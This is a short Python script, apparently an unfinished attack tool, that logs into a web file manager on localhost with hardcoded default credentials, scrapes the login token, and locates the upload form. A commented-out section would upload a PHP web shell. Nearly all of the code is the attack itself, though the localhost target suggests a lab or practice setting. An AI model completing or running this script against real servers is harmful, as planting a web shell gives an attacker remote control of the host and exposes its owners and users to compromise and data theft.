import requests
from bs4 import BeautifulSoup

session = requests.Session()

r = session.request(method='GET', url='http://127.0.0.1')

soup = BeautifulSoup(r.text, 'html.parser')

token = soup.find('input', {'name': 'token'})

creds = {
    "fm_usr": 'admin',
    "fm_pwd": 'admin@123',
    "token": token.get('value')
}

r1 = session.request(method='POST', url='http://127.0.0.1/index.php', data=creds)

#dropzone card-tabs-container

def upload_webshell(url, token=None):

    r = session.request(method='GET', url='http://127.0.0.1/index.php?p=new&upload')

    if token:
        soup = BeautifulSoup(r.text, 'html.parser')
        form = soup.find('form', class_='dropzone card-tabs-container')

        # Si no se encuentra por clase, buscar por ID
        # if form is None:
        #     form = soup.find('form', id='fileUploader')


        print(form)
        input()

    # with open('webshell.php', 'rb') as ws:
    #     webshell_content = ws.read()

    #     file = {
    #         "file": ("webshell.php", webshell_content.strip())
    #     }

    #     file_name = {
    #         "fullpath": "webshell.php"
    #     }

    #     upload_response = session.request(method="POST", url=url, data=file_name, files=file)
    #     if upload_response.status_code == 200:
    #         print("archivo subido")


upload_webshell('http://localhost/index.php?p=new', token='yes')